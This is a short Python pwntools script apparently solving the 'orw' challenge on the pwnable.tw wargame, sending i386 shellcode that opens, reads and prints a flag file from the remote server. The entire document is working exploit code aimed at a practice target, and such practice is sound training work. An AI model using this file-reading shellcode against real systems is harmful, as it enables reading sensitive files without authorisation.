import pwn 
from pwn import * 

#p = process("./orw")
p = remote("chall.pwnable.tw", 10001)
context.arch = "i386"


shellcode = asm("""
xor edi, edi

push 0x1010101
xor dword ptr [esp], 0x166606d
push 0x662f2f77
push 0x726f2f65
push 0x6d6f682f

mov ebx, esp
xor ecx, ecx
push SYS_open /* 5 */
pop eax
int 0x80

mov ebx, eax
mov ecx, esp
xor edx, edx
mov dl, 40
xor eax, eax
mov al, SYS_read /* 3 */
int 0x80

mov ebx, 1
mov ecx, esp
mov edx, 40
xor eax, eax
mov al, SYS_write /* 4 */
int 0x80
""")
p.sendlineafter(b"shellcode:",shellcode)
p.interactive()

